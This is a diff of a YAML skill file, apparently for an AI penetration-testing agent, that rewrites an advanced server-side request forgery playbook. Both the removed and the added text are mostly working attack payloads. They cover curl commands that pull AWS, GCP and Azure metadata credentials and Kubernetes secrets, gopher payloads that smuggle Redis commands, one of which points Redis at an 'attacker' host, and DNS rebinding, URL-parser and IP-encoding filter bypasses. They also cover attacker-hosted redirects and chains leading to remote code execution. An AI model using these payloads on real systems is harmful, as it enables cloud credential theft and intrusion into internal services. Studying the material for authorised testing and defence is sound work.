@@ -2,122 +2,70 @@ schema_version: 1
 version: 3.0.0
 name: ssrf-advanced
 description: >
-  Advanced SSRF assessment covering cloud metadata extraction (AWS IMDSv1/IMDSv2/GCP/Azure/K8s),
-  internal service fabric attacks via gopher/dict/file wrappers, DNS rebinding, URL parser
-  differentials, OAST-based blind SSRF, and multi-hop redirect chains. Enhances the base ssrf skill
-  with deeper protocol abuse, chaining strategies, and Kubernetes control plane attacks.
+  Advanced Server-Side Request Forgery (SSRF) exploitation — Blind Out-of-Band (OAST) confirmation,
+  Gopher protocol stream smuggling (Redis/FastCGI/SMTP), DNS rebinding attacks, and URL parser discrepancies.
 triggers:
-  - ssrf advanced
   - blind ssrf
-  - oast ssrf
+  - oob ssrf
   - dns rebinding
-  - gopher protocol
-  - ssrf gopher
+  - gopher redis
+  - url parser differential
   - ssrf chaining
-  - fastcgi ssrf
-  - ssrf kubernetes
-  - ssrf redis
-  - interactsh
-  - ssrf bypass
-  - url confusion
+  - gopher protocol
 tools:
   - curl
-  - httpx
   - python3
 knowledge: |
-  Any feature that fetches remote content on behalf of a user is a potential tunnel to internal
-  networks and control planes. Bind scheme/host/port/headers explicitly or expect an attacker
-  to route through them. Always use OAST oracle first before attempting internal pivots.
+  Advanced SSRF attacks target protocol smuggling, asynchronous out-of-band communication, and parser
+  discrepancies between validation gateways and backend HTTP clients.
 
-  1. OAST BLIND SSRF (Confirm Egress First):
-     interactsh-client -v &   (launches in background, prints unique *.oast.fun domain)
-     Embed unique domain in every SSRF parameter:
-       ?url=http://UNIQUE.oast.fun/path
-       ?webhook=http://UNIQUE.oast.fun/callback
-       ?avatar=http://UNIQUE.oast.fun/img.png
-     Watch interactsh stdout for inbound DNS/HTTP hit. Restart interactsh between payloads
-     to correlate hits to specific requests.
+  1. BLIND OAST CONFIRMATION (OUT-OF-BAND SINK TRIAGE):
+     When the application fetches URLs asynchronously (e.g. webhooks, PDF generators, link previews):
+     - Supply an external interactsh or collaborator listener URL:
+       `https://UNIQUE.interactsh-domain.com`
+     - Observe incoming protocol:
+       * DNS query only: Application resolves target domain but TCP connection is blocked by egress firewall.
+       * DNS + HTTP GET: Application has full outbound egress; verify user-agent header to fingerprint HTTP client
+         (e.g., Python-urllib, Apache-HttpClient, Go-http-client, cURL, Headless Chrome).
 
-  2. HIGH-VALUE CLOUD METADATA TARGETS:
-     AWS IMDSv1 (no auth required):
-       curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
-       curl -s http://169.254.169.254/latest/user-data
-       # AWS ECS task credentials (from container: read env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI and append to base URL)
-       curl -s http://169.254.170.2/CREDENTIALS_PATH
-     GCP (requires Metadata-Flavor: Google header — verify sink can set custom headers):
-       curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
-         -H "Metadata-Flavor: Google"
-     Azure MSI OAuth (requires Metadata: true header):
-       curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
-         -H "Metadata: true"
+  2. GOPHER PROTOCOL STREAM SMUGGLING:
+     When backend URL libraries support alternative schemes (cURL with ALL protocols enabled):
+     Construct arbitrary TCP payload byte streams using `gopher://`:
+     a. Redis Remote Command Execution:
+        Inject Redis RESP protocol commands to write an authorized SSH key or web shell:
+        `gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0D%0ACONFIG%20SET%20dbfilename%20dump.rdb%0D%0AQUIT`
+     b. Internal FastCGI / PHP-FPM (Port 9000):
+        Craft FastCGI binary records over gopher to invoke php-fpm handlers and execute arbitrary commands.
+     c. Internal SMTP (Port 25):
+        `gopher://127.0.0.1:25/_HELO%20target%0D%0AMAIL%20FROM:...%0D%0ARCPT%20TO:...`
 
-  3. KUBERNETES INTERNAL ATTACK SURFACE:
-     API server (service account token reuse if sink propagates headers):
-       curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/secrets
-     Kubelet unauthenticated read-only (deprecated but still present in older clusters):
-       curl -s http://NODE_IP:10255/pods
-     Cluster DNS enumeration via SSRF:
-       Attempt: kube-dns.kube-system.svc.cluster.local, metrics-server.kube-system.svc.cluster.local
-     Exec endpoint (high impact — requires kubelet write access):
-       POST https://NODE_IP:10250/exec/default/POD_NAME/CONTAINER -- command
+  3. DNS REBINDING (TIME-OF-CHECK VS TIME-OF-USE - TOCTOU):
+     When the application validates destination IP against a denylist before issuing the request:
+     - Pre-request Check: The application resolves domain `rebind.attacker.com` -> returns benign IP (e.g. 1.2.3.4)
+     - Validation: 1.2.3.4 is public -> check passes!
+     - Request Execution: The HTTP client resolves domain `rebind.attacker.com` a second time -> returns 127.0.0.1 (TTL=0)
+     - Tooling: Configure dual A records with TTL=0 using rbndr.us or custom authoritative DNS server:
+       `http://7f000001.01020304.rbndr.us`
 
-  4. INTERNAL SERVICE PROTOCOL ATTACKS:
-     Docker Engine API (no TLS, internal-only):
-       curl -s http://127.0.0.1:2375/v1.24/containers/json
-     Redis via gopher (craft GET/SET commands):
-       gopher://127.0.0.1:6379/_SLAVEOF%20attacker%206379%0D%0AQUIT
-     FastCGI/PHP-FPM via gopher (trigger PHP file execution):
-       gopher://127.0.0.1:9000/_(crafted FastCGI records for file write)
-     Elasticsearch: curl -s http://127.0.0.1:9200/_cat/indices?v
-     RabbitMQ admin UI: http://127.0.0.1:15672/api/queues
+  4. URL PARSER DIFFERENTIALS & CREDENTIAL PARSING (@ / #):
+     Different URL parsing libraries (Python urllib, Node.js WHATWG, Go net/url, cURL) disagree on authority boundaries:
+     - Userinfo delimiter confusion:
+       `http://expected-host.com@169.254.169.254/`
+       (Validation regex checks string before '@', but HTTP client connects to host after '@')
+     - Fragment identifier confusion:
+       `http://169.254.169.254#@expected-host.com/`
+     - Dotless decimal & hexadecimal IP notation:
+       `http://2130706433/` (127.0.0.1 in decimal)
+       `http://0x7f000001/` (127.0.0.1 in hex)
 
-  5. ADDRESS ENCODING — IP FILTER BYPASS:
-     127.0.0.1 alternatives:
-       127.1         (truncated notation)
-       2130706433    (dword/integer: 127*256^3+1)
-       0x7f000001    (hexadecimal)
-       [::1]         (IPv6 loopback)
-       [::ffff:127.0.0.1]  (IPv4-mapped IPv6)
-       127.0.0.1.nip.io    (DNS resolution bypass)
-     Private ranges: 10/8, 172.16/12, 192.168/16, 169.254/16
-
-  6. URL PARSER DIFFERENTIAL ATTACKS:
-     Attacker tricks: allowlist checker sees one host, fetching library sees another:
-       http://attacker@internal/         (userinfo in authority)
-       http://internal#@attacker.com/   (fragment confusion)
-       http://INTERNAL.attacker.com/    (subdomain of attacker resolves to internal IP)
-       Trailing dot: http://internal./  (dot after TLD bypasses naive string match)
-     Mixed case: HTTP://INTERNAL  vs http://internal (case sensitivity varies by library)
-
-  7. DNS REBINDING ATTACK:
-     Register DNS name with very short TTL:
-       Round 1 resolution: returns allowed external IP (passes allowlist)
-       Round 2 resolution: returns internal IP (bypasses allowlist)
-     Use custom NS with rapid TTL rotation; race the resolution window in the target service.
-
-  8. REDIRECT CHAIN ATTACKS:
-     Host an endpoint that returns 302 → internal target:
-       curl -I http://ATTACKER/redirect → Location: http://169.254.169.254/latest/meta-data/
-     Multi-hop and protocol switches (http→gopher, http→file):
-       302 → 302 → file:///etc/passwd  (if multi-hop redirect following enabled)
-     Test with custom redirect server on interactsh callback domain.
-
-  9. SSRF CHAINING ATTACKS:
-     SSRF → Cloud metadata creds → cloud API (list S3 buckets, read Secrets Manager)
-     SSRF → Redis gopher → file write → cron job → RCE
-     SSRF → Kubelet/API → pod list → service account token → lateral movement
-     SSRF → Docker daemon → container listing → escape → host compromise
-
-  VALIDATION:
-     a. Prove outbound server-initiated request via OAST interaction (not client-side)
-     b. Show access to non-public resources (metadata creds, internal admin, service ports)
-     c. Demonstrate minimal-impact credential access (short-lived token) or harmless internal read
-     d. Confirm reproducibility; document exact parameter/sink that controls scheme/host/headers
+  5. HTTP 302 REDIRECT CHAINING (PRE-CHECK BYPASS):
+     When input validation strictly rejects private IP strings:
+     - Point the input parameter to an attacker web server returning HTTP 302:
+       `Location: http://127.0.0.1:6379/`
+     - If the HTTP client library follows redirects automatically, it bypasses the initial allowlist check.
 references:
   - https://portswigger.net/web-security/ssrf
-  - https://attack.mitre.org/techniques/T1090/
-  - https://blog.assetnote.io/
-  - https://github.com/projectdiscovery/interactsh
+  - https://attack.mitre.org/techniques/T1190/
 provenance:
   origin: builtin
   source: persona/v0.1/skills/ssrf-advanced.yaml
